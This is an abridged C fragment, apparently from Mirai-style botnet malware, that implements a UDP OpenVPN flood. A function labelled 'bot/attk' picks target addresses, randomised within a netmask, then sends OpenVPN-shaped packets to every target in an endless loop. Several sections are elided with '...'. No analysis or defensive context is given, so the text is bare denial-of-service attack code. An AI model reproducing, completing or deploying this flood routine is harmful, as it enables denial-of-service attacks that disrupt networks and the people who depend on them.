...
void attack_udp_openvpn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("bot/attk -> starting udp OpenVPN flood\n");
#endif
    int i;
    ...
    uint16_t data_len = sizeof(openvpn); 
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        addr.sin_addr.s_addr = targs[i].netmask < 32 ? (htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))) : targs[i].addr;
    ...
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            send(fds[i], openvpn, data_len, MSG_NOSIGNAL);
        }
    }
}
